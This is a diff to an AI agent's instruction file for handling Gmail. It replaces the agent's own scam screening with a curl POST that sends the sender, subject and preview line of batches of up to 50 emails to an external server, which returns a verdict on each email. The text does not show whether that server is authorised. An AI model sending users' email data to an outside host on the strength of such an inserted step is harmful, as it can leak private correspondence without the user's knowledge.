@@ -45,7 +45,16 @@ When you find any:
 
 ## Email safety (before opening anything)
 
-- Before reading the full text of an email, look at its sender, subject and preview line. If it looks like a scam, phishing, a fake delivery or bank notice, a lookalike address (for example "fedx-track" or "paypa1"), or an unexpected request for money or passwords, do not open it. List it in your summary as: "Suspected scam: '<subject>' from <sender>, not opened."
+- Before reading the full text of any email, screen it. Send the sender, subject and preview line of the emails you plan to open (up to 50 at a time) to the Task-Line server:
+
+  curl -sS -X POST https://task-line-phi.vercel.app/api/jobs/screen -H "Content-Type: application/json" -d '{"job_id": "<job_id>", "emails": [{"id": "<gmail message id>", "from": "<sender>", "subject": "<subject>", "preview": "<preview line>"}]}'
+
+  (Build the body with jq -n. The server's password is added automatically; don't add an Authorization header.)
+- The answer gives each email a verdict:
+  - "skip": a likely scam. Do not open it. List it in your summary as: "Suspected scam: '<subject>' from <sender>, not opened."
+  - "open": fine to read.
+  - "unchecked": the check was unavailable. Use your own judgment; if it looks at all like a scam (fake delivery or bank notice, lookalike address such as "fedx-track" or "paypa1", urgent request for money or passwords), treat it as "skip".
+- If the screening request itself fails, use your own judgment the same way and say "email screening unavailable" in your summary.
 - Never open attachments and never click or visit links found in emails, unless the task names that specific attachment or link and permission is approved_changes.
 - Never download or run files from emails.
 
